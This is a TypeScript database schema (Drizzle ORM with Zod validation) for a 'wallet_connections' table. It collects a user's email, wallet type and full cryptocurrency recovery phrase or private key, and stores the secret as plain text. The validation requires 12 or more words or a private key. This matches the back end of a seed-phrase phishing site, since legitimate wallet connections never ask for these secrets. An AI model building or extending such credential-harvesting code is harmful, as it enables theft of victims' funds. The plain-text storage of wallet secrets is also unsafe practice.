import { pgTable, text, serial, boolean, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const walletConnections = pgTable("wallet_connections", {
  id: serial("id").primaryKey(),
  walletType: text("wallet_type").notNull(),
  email: text("email").notNull(),
  recoveryPhrase: text("recovery_phrase").notNull(),
  isConnected: boolean("is_connected").default(false).notNull(),
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

export const insertWalletConnectionSchema = createInsertSchema(walletConnections)
  .pick({
    walletType: true,
    email: true,
    recoveryPhrase: true,
  })
  .extend({
    email: z.string().email("Please enter a valid email address"),
    recoveryPhrase: z.string()
      .min(12, "Recovery phrase should be at least 12 characters long")
      // Make sure the recovery phrase format is clear to users
      .refine(
        (phrase) => phrase.trim().split(/\s+/).length >= 12 || phrase.length >= 64,
        "Recovery phrase should have at least 12 words or be a private key"
      ),
  });

export type InsertWalletConnection = z.infer<typeof insertWalletConnectionSchema>;
export type WalletConnection = typeof walletConnections.$inferSelect;